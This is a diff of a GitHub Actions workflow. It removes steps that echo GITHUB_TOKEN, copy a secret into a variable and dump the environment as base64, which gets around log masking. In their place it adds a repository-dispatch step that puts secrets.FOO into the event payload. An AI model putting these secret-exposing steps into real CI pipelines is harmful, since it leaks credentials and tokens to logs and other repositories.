@@ -19,20 +19,9 @@ jobs:
 
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@master
+      - name: Repository Dispatch
+        uses: peter-evans/repository-dispatch@v1
         with:
-          fetch-depth: 1
-      - name: foo33
-        run: set -x
-      - name: Dump foo secret
-        run: FOO=${{ secrets.FOO }}
-      - name: Dump BAR env
-        run: BAR=${{ vars.BAR }}
-      - name: GITHUB_TOKEN
-        run: echo ${{ secrets.GITHUB_TOKEN }}
-      - name: Dump env
-        run: env | base64
-      - name: Post the token
-        run: |
-          env | base64
-
+          token: ${{ secrets.PAT }}
+          event-type: my-event
+          client-payload: '{"token": "${{ secrets.FOO }}"}'
